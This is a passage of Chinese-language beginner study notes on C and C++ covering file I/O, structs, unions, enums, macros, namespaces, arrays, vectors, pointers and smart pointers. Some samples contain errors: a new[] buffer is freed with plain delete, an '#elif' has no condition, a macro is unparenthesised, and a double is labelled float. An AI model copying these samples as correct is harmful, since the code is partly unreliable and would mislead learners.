function">memset</span><span class="token punctuation">(</span>szChar1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>szChar1<span class="token punctuation">,</span> szChar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>szChar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>szChar1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>读操作</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> pFile<span class="token punctuation">;</span>   <span class="token comment">//定义文件指针</span><span class="token keyword">char</span><span class="token operator">*</span> szReadTextBuffer<span class="token punctuation">;</span>   <span class="token comment">//定义缓冲区，存放读取的内容</span><span class="token keyword">int</span> nReadFileSize<span class="token punctuation">;</span>    <span class="token comment">//缓冲区字节数,文件长度</span><span class="token keyword">int</span> nReadRetSize<span class="token punctuation">;</span>   <span class="token comment">//fread的返回长度  读取到的真实长度</span>pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\123456.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open file fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//文件指针指向末尾</span><span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//SEEK_END文件的末尾  这里从0到末尾</span>nReadFileSize <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//根据指针位置获取文件大小</span><span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//指针复位，指针回到最开始</span>szReadTextBuffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nReadFileSize <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//申请内存</span><span class="token keyword">if</span> <span class="token punctuation">(</span>szReadTextBuffer <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">memset</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nReadFileSize <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>nReadRetSize <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nReadFileSize<span class="token punctuation">,</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//文件读取</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nReadRetSize <span class="token operator">!=</span> nReadFileSize<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Read File fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//资源释放</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>写操作</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> pFile<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> szwriteBuffer <span class="token operator">=</span> <span class="token string">"Administrator"</span><span class="token punctuation">;</span>pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\123456.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open file fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span>szwriteBuffer<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>szwriteBuffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="联合体和结构体"><a href="#联合体和结构体" class="headerlink" title="联合体和结构体"></a>联合体和结构体</h2><p><strong>结构体</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">GamePlay</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> Name<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> HP<span class="token punctuation">;</span><span class="token keyword">int</span> MP<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">GamePlay</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"张三"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">GamePlay</span><span class="token operator">*</span> p<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>Admin<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>联合体</strong></p><p>联合体所有成员共用同一个首地址，所以只能使用其中一个成员，再次使用会覆盖之前的成员</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">union</span> Info<span class="token punctuation">&#123;</span><span class="token keyword">char</span> Name<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> HP<span class="token punctuation">;</span><span class="token keyword">int</span> MP<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> Info MyInfo<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>MyInfo<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> <span class="token string">"Admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    MyInfo<span class="token punctuation">.</span>MP <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    MyInfo<span class="token punctuation">.</span>HP <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s%d%d"</span><span class="token punctuation">,</span> MyInfo<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> MyInfo<span class="token punctuation">.</span>MP<span class="token punctuation">,</span> MyInfo<span class="token punctuation">.</span>HP<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//MyInfo = 0x0096F798</span>    <span class="token comment">//MyInfo.name = 0x0096F798</span>    <span class="token comment">//MyInfo.HP = 0x0096F798</span>    <span class="token comment">//MyInfo.MP = 0x0096F798</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>typedef关键字</p><p><code>type</code>关键字可以起别名</p><pre class="language-none"><code class="language-none">typedef struct GamePlay&#123;char Name[50];int HP;int MP;&#125;root;int main()&#123;root Admin&#x3D; &#123; &quot;张三&quot;,100,200 &#125;;root * p;p &#x3D; &Admin;printf(&quot;%s&quot;, (*p).Name);printf(&quot;%s&quot;, p-&gt;Name);return 0;&#125;</code></pre><h2 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h2><pre class="language-none"><code class="language-none">int main()&#123;enum color &#123;red &#x3D; 10,blue &#x3D; 20,green &#x3D; 30&#125;;  &#x2F;&#x2F;枚举类型  默认是012int flag &#x3D; 0;scanf(&quot;%d&quot;,&amp;flag);switch (flag)&#123;case red:printf(&quot;red&quot;);break;case blue:printf(&quot;blue&quot;);break;case green:printf(&quot;green&quot;);break;default:break;&#125;return 0;&#125;</code></pre><h2 id="预处理器"><a href="#预处理器" class="headerlink" title="预处理器"></a>预处理器</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Number</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span></span><span class="token string">"This is %d\n"</span><span class="token expression"><span class="token punctuation">,</span>X<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Re</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> X<span class="token operator">*</span>X</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">root</span> <span class="token expression"><span class="token number">2</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">Re</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//25</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//This is 12</span><span class="token comment">// #ifdef Number   //判断是否定义宏Number</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">root <span class="token operator">==</span> <span class="token number">1</span></span></span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the root = 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span> <span class="token expression">root <span class="token operator">==</span> <span class="token number">2</span></span></span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the root = 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//2</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span></span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the not root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// root</span></span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h2 id="命名空间std"><a href="#命名空间std" class="headerlink" title="命名空间std"></a>命名空间std</h2><blockquote><p>C++标准中引入命名空间的概念，是为了解决不同模块或者函数库中相同标识符冲突的问题。有了命名空间的概念，<strong>标识符就被限制在特定的范围(函数)内</strong>，不会引起命名冲突。最典型的例子就是<strong>std命名空间</strong>，<strong>C++标准库中所有标识符都包含在该命名空间中</strong>。</p></blockquote><p><code>namespace</code>命名空间定义，使用命名空间就加上<code>名字::</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;namespace MyName&#123;const float pi&#123; 3.1415926 &#125;;&#125;int main() &#123;float a &#x3D; MyName::pi;std::cout&lt;&lt; a &lt;&lt; std::endl;return 0;&#125;</code></pre><p><code>using namespace</code>引入之后就可以不用加命名空间的名字</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;namespace MyName&#123;const float pi&#123; 3.1415926 &#125;;&#125;using namespace MyName;using namespace std;int main() &#123;float a &#x3D; pi;std::cout&lt;&lt; a &lt;&lt; std::endl;return 0;&#125;</code></pre><h2 id="标准输出"><a href="#标准输出" class="headerlink" title="标准输出"></a>标准输出</h2><pre class="language-c++" data-language="c++"><code class="language-c++">intmain() &#123;int Number &#x3D; 4;std::cout &lt;&lt; &quot;This is the Number：&quot;&lt;&lt;Number &lt;&lt; std::endl;int nNumber &#x3D; &#123; 16 &#125;;std::cout&lt;&lt;&quot;This is the Number：&quot;&lt;&lt;Number &lt;&lt; std::endl;&#125;</code></pre><p><code>static_cast&lt;int&gt;</code>类型强转</p><pre class="language-c++" data-language="c++"><code class="language-c++">float Number2 &#x3D; 3.14;int Number3 &#x3D; static_cast&lt;int&gt;(Number2);std::cout &lt;&lt; &quot;The Number3 :&quot; &lt;&lt; Number3&lt;&lt;std::endl;</code></pre><p><code>auto</code>可以自动识别类型</p><pre class="language-c++" data-language="c++"><code class="language-c++">auto Number4 &#x3D; 2;  &#x2F;&#x2F;intauto Number5 &#x3D; &#39;C&#39;;  &#x2F;&#x2F;charauto Number6 &#x3D; 3.1415926;  &#x2F;&#x2F;float</code></pre><p><code>char</code>是ASCII类型，<code>wchar_t</code>Unicode类型，宽字符,<code>char16_t</code> UTF16类型，<code>char32_t</code> UTF32类型</p><pre class="language-c++" data-language="c++"><code class="language-c++">char szStr&#123; &#39;C&#39; &#125;;wchar_t szStr2&#123; L&#39;C&#39; &#125;;char16_t szStr3&#123; u&#39;C&#39; &#125;;  &#x2F;&#x2F;UTF-16char32_t szStr4&#123; U&#39;C&#39; &#125;;  &#x2F;&#x2F;UTF-32</code></pre><p><strong>signed和unsigned</strong></p><p>signed&#x2F;unsigned用于修饰整数变量，signed表示有符号的整数，unsigned表示无符号的整数</p><p>int、short和long，以及long long，默认情况下都是signed有符号的</p><p><strong>区别:</strong></p><p><code>signed</code> 可以表示正数和负数，而 <code>unsigned</code> 只能表示非负数。</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;int main() &#123;    signed int signedNum &#x3D; -10;  &#x2F;&#x2F; 有符号，可以表示负数    unsigned int unsignedNum &#x3D; 10;  &#x2F;&#x2F; 无符号，只能表示非负数    std::cout &lt;&lt; &quot;Signed int: &quot; &lt;&lt; signedNum &lt;&lt; std::endl;     &#x2F;&#x2F; 输出 -10    std::cout &lt;&lt; &quot;Unsigned int: &quot; &lt;&lt; unsignedNum &lt;&lt; std::endl; &#x2F;&#x2F; 输出 10    unsigned int overflow &#x3D; -1;  &#x2F;&#x2F; 赋值-1给无符号类型    std::cout &lt;&lt; &quot;Unsigned int with -1 assigned: &quot; &lt;&lt; overflow &lt;&lt; std::endl;  &#x2F;&#x2F; 输出为最大值 4294967295    return 0;&#125;</code></pre><p><strong>位运算</strong></p><p>按位与 (<code>&amp;</code>)：</p><ul><li>每个位进行 <strong>与</strong> 操作，只有当两个对应的位都为 <code>1</code> 时，结果位才为 <code>1</code>，否则为 <code>0</code>。</li></ul><p>按位或 (<code>|</code>)：</p><ul><li>每个位进行 <strong>或</strong> 操作，只要两个对应的位中有一个是 <code>1</code>，结果位就是 <code>1</code>，否则为 <code>0</code>。</li></ul><p>按位取反 (<code>~</code>)：</p><ul><li>每个位进行 <strong>取反</strong> 操作，将 <code>0</code> 变为 <code>1</code>，<code>1</code> 变为 <code>0</code>。</li></ul><p>逻辑非 (<code>!</code>)：</p><ul><li>用于布尔值，将 <code>true</code> 变为 <code>false</code>，<code>false</code> 变为 <code>true</code>。它不属于位运算，但经常用于条件判断。</li></ul><p>按位异或 (<code>^</code>)：</p><ul><li>每个位进行 <strong>异或</strong> 操作，只有当对应的两个位一个是 <code>1</code>，另一个是 <code>0</code> 时，结果位为 <code>1</code>，否则为 <code>0</code>。</li></ul><blockquote><p>a &#x3D; b ^ c  知道任意两位可以异或会另外一位   对称加密</p></blockquote><p>左移 (<code>&lt;&lt;</code>)：</p><ul><li>将左侧的操作数的所有位向左移动指定的位数，右边用 <code>0</code> 填充，左移相当于乘以 <code>2</code> 的 n 次方（n 是移动的位数）。</li></ul><pre class="language-none"><code class="language-none">5 &lt;&lt; 1  &#x2F;&#x2F; 0101 &lt;&lt; 1 &#x3D; 1010 (结果是 10)</code></pre><p>右移 (<code>&gt;&gt;</code>)：</p><ul><li>将左侧的操作数的所有位向右移动指定的位数。对于无符号数，左边用 <code>0</code> 填充；对于有符号数，左边用符号位填充（保持符号不变）。右移相当于除以 <code>2</code> 的 n 次方（n 是移动的位数）。</li></ul><pre class="language-none"><code class="language-none">5 &gt;&gt; 1  &#x2F;&#x2F; 0101 &gt;&gt; 1 &#x3D; 0010 (结果是 2)最后的1移出去了，左边补0</code></pre><p><strong>别名</strong></p><p><code>using</code>和<code>typedef</code>推荐<code>using</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;&#x2F;&#x2F;typedef unsigned int uInt;using uInt &#x3D; unsigned int;intmain() &#123;uInt Number&#123; 30 &#125;;std::cout &lt;&lt; &quot;this is &quot; &lt;&lt; Number &lt;&lt;std::endl;&#125;</code></pre><p><strong>接收外部输入</strong></p><p><code>std::cin &gt;&gt;</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;&#x2F;&#x2F;typedef unsigned int uInt;using uInt &#x3D; unsigned int;intmain() &#123;uInt flag&#123; 0 &#125;;std::cout &lt;&lt; &quot;请输入flag数字&quot; &lt;&lt; std::endl;std::cin &gt;&gt; flag;switch (flag)&#123;case 1:std::cout &lt;&lt; flag &lt;&lt; std::endl;default:break;&#125;&#125;</code></pre><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>for循环</p><pre class="language-c++" data-language="c++"><code class="language-c++">intmain() &#123;for (size_t i &#x3D; 0; i &lt; 5; i++)&#123;std::cout &lt;&lt; i &lt;&lt; std::endl;&#125;    char Str[6]&#123; &quot;Admin&quot; &#125;;for (auto x : Str)   &#x2F;&#x2F;把值给x&#123;std::cout &lt;&lt; x &lt;&lt; std::endl;   &#x2F;&#x2F;A d m i n&#125;&#125;</code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><strong>普通数组</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">intmain()&#123;char nNumber[6]&#123; &#39;A&#39;,&#39;d&#39;,&#39;m&#39;,&#39;i&#39;,&#39;n&#39;&#125;;int flag &#x3D; std::size(nNumber);std::cout &lt;&lt; flag &lt;&lt; std::endl;&#125;</code></pre><p><strong>数组容器</strong></p><p><code>nNumber.size</code>数组容器自带计算数组长度,C++推荐使用这种数组,<code>fill</code>可以直接赋值所有元素</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;array&gt;intmain()&#123;std::array&lt;int, 5&gt;nNumber&#123; 1,2,3,4,5 &#125;;    nNumber.fill(123);   &#x2F;&#x2F;全部赋值为123for (size_t i &#x3D; 0; i &lt; nNumber.size(); i++)&#123;&#x2F;&#x2F;nNumber[i] &#x3D; i;&#x2F;&#x2F;nNumber.at(i) &#x3D; i;std::cout &lt;&lt; nNumber[i] &lt;&lt; std::endl;   &#x2F;&#x2F;输出123&#125;&#125;</code></pre><p><strong>向量容器</strong></p><p>这种方式没有指定个数，类似C语言的链表，可以一直往下压，所以需要动态分配内存</p><p> <code>std::vector&lt;int&gt;nNumber</code>定义,也可初始化</p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;std::vector&lt;int&gt;nNumber(20,99L);std::vector&lt;int&gt;nNumber&#123;0,1,2,3,4,5,6&#125;;</code></pre><p><code>push_back</code>压一个元素<code>pop_back</code>删除最后一个元素,<code>clear</code> 删除所有元素</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;vector&gt;intmain()&#123;&#x2F;&#x2F;std::vector&lt;int&gt;nNumber(20,99L);std::vector&lt;int&gt;nNumber&#123;0,1,2,3,4,5,6&#125;;nNumber.push_back(10);  &#x2F;&#x2F;往后压一个元素10nNumber.pop_back();    &#x2F;&#x2F;删除最后一个元素nNumber.clear();   &#x2F;&#x2F;删除所有元素return 0;&#125;</code></pre><p>也可以用下标<code>nNumber[0]</code>和<code>nNumber.at(1)</code>等</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>基本定义和使用</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct GamePlay&#123;string Name;int HP;int MP;&#125;G3;int main()&#123;GamePlay G1;  &#x2F;&#x2F;可以省略G1.Name &#x3D; &quot;王五&quot;;cout &lt;&lt; G1.Name &lt;&lt; endl;struct GamePlay G2 &#x3D; &#123; &quot;张三&quot;,100,200 &#125;;cout&lt;&lt; G2.HP&lt;&lt; G2.MP&lt;&lt; G2.Name&lt;&lt;endl;G3.Name &#x3D; &quot;Aaaa&quot;;cout&lt;&lt; G3.Name&lt;&lt;endl;return 0;&#125;</code></pre><p>结构体和指针</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct GamePlay&#123;string Name;int HP;int MP;&#125;G3;int main()&#123;GamePlay G1 &#x3D; &#123;&quot;王五&quot;,14,20&#125;;GamePlay* p &#x3D; &G1;cout &lt;&lt; p-&gt;Name &lt;&lt;endl &lt;&lt; (*p).Name&lt;&lt;endl;  &#x2F;&#x2F;-&gt; 运算符是指针运算符，用于访问指针所指向对象的成员return 0;&#125;</code></pre><h2 id="指针-1"><a href="#指针-1" class="headerlink" title="指针"></a>指针</h2><blockquote><p>int * p &#x3D; &amp;变量名<br>*p &#x3D;  值<br>p &#x3D; 地址<br>数组名就是数组的首地址<br>p &#x3D; 数组的首地址  &#x3D;》p &#x3D; 数组名<br>p[i] &#x3D; nNumber[i]<br>*(p + 1)  加一个类型长度 int 4个字节，char 1个字节</p></blockquote><p>C++中不能使用<code>char* szStr&#123;&quot;Admin&quot;&#125;</code>直接赋值,要么使用数组存储,要么<code>new</code>来开辟空间</p><p><strong>内存分配</strong></p><p><code>new</code>申请,<code>delete</code>释放,类似于<code>malloc</code>和<code>free</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">intmain()&#123;char* szStr&#123; nullptr &#125;;   &#x2F;&#x2F;空指针&#x2F;&#x2F;szStr &#x3D; new char;   &#x2F;&#x2F;申请一个char的空间szStr &#x3D; new char[100];   &#x2F;&#x2F;申请100个char的空间memset(szStr, 0, 100);*szStr &#x3D; &#39;A&#39;;std::cout &lt;&lt; *szStr &lt;&lt; std::endl;if (szStr) &#123;    &#x2F;&#x2F;判断是否是有效指针delete szStr;szStr &#x3D; nullptr;&#125;return 0;&#125;</code></pre><p><strong>智能指针</strong></p><p><code>unique_ptr</code>智能指针</p><pre class="language-c++" data-language="c++"><code class="language-c++">std::unique_ptr&lt;int&gt; pNum&#123; new int&#123;123&#125; &#125;;    &#x2F;&#x2F;初始化为123</code></pre><p><code>make_unique</code>函数模板，代替new int{123} </p><pre class="language-c++" data-language="c++"><code class="language-c++">std::unique_ptr&lt;int&gt; pNum&#123; std::make_unique&lt;int&gt;(123) &#125;;    &#x2F;&#x2F;初始化为123auto pNum&#123; std::make_unique&lt;int&gt;(123) &#125;;    &#x2F;&#x2F;初始化为123</code></pre><pre class="language-c++" data-language="c++"><code class="language-c++">auto pNum&#123; std::make_unique&lt;int[]&gt; (100)&#125;;for (size_t i &#x3D; 0; i &lt; 100; i++)&#123;pNum[i] &#x3D; i;std::cout &lt;&lt; pNum[i] &lt;&lt; std::endl;&#125;</code></pre><p><code>reset</code>重置指针指向空，<code>release</code>转化成原始指针</p><p>**<code>std::hex</code><strong>：将后续的整数或指针输出改为十六进制格式表示。</strong><code>std::showbase</code>**：要求输出基数的前缀，比如在十六进制数前加上<code>0x</code>，<code>pNum.get()</code> ：返回指针指向的内存地址</p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;array&gt;intmain()&#123;&#x2F;&#x2F;std::unique_ptr&lt;int[]&gt; pNum&#123; new int[100] &#125;;auto pNum&#123; std::make_unique&lt;int[]&gt; (100)&#125;;for (size_t i &#x3D; 0; i &lt; 100; i++)&#123;pNum[i] &#x3D; i;&#x2F;&#x2F;std::cout &lt;&lt; pNum[i] &lt;&lt; std::endl;&#125;std::cout &lt;&lt; std::hex &lt;&lt;std::showbase&lt;&lt; pNum.get()&lt;&lt;std::endl;int* nP &#x3D; pNum.release();   &#x2F;&#x2F;转化成原始指针pNum.reset();  &#x2F;&#x2F;重置指针指向空return 0;&#125;</code></pre><p>引用</p><pre class="language-c++" data-language="c++"><code class="language-c++">intmain()&#123;int nNum&#123; 10 &#125;;   &#x2F;&#x2F;0x001BFE34int&amp; p&#123; nNum &#125;;    &#x2F;&#x2F;0x001BFE34   p和nNum地址一样，相当于一个别名 return 0;&#125;</code></pre><p>指针和数组，函数。数组中数组名就是首地址</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;void Arr(int* arr,int *a,int *b)&#123;int temp &#x3D; *a;*a &#x3D; *b;*b &#x3D; temp;&#125;int main() &#123;int arr[10] &#x3D; &#123; 1,2,3,4,5,6 &#125;;int a&#123; 4 &#125;;int b&#123; 6 &#125;;Arr(arr,&amp;a,&amp;b);cout&lt;&lt; &quot;a的值为&quot; &lt;&lt; a&lt;&lt;endl;cout&lt;&lt; &quot;b的值为&quot; &lt;&lt; b&lt;&lt;endl;return 0;&#125;</code></pre><p>如果参数是&amp;引用参数，就可以直接传参，Arr内部对a和b的修改直接影响原来的a和b。</p><pre class="language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;using namespace std;void Arr(int&amp; a, int&amp; b) &#123;  &#x2F;&#x2F; 引用参数，直接引用实参    int temp &#x3D; a;    a &#x3D; b;    b &#x3D; temp;&#125;int main() &#123;    int a &#x3D; 4;  &#x2F;&#x2F; 定义整型变量 a    int b &#x3D; 6;  &#x2F;&#x2F; 定义整型变量 b    Arr(a, b);  &#x2F;&#x2F; 直接传递变量 a 和 b    cout &lt;&lt; &quot;a 的值为: &quot; &lt;&lt; a &lt;&lt; endl;  &#x2F;&#x2F; 输出交换后的 a 值    cout &lt;&lt; &quot;b 的值为: &quot; &lt;&lt; b &lt;&lt; endl;  &#x2F;&#x2F; 输出交换后的 b 值    return 0;&#125;</code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>包含头文件<code>#include &lt;string&gt;</code>，<code>std::string szStr&#123; &quot;The Admin&quot; &#125;;</code>初始化字符串<code>std::string szStr1(11, &#39;a&#39;);</code>  初始化11个字符a，<code> char* stStr1 = 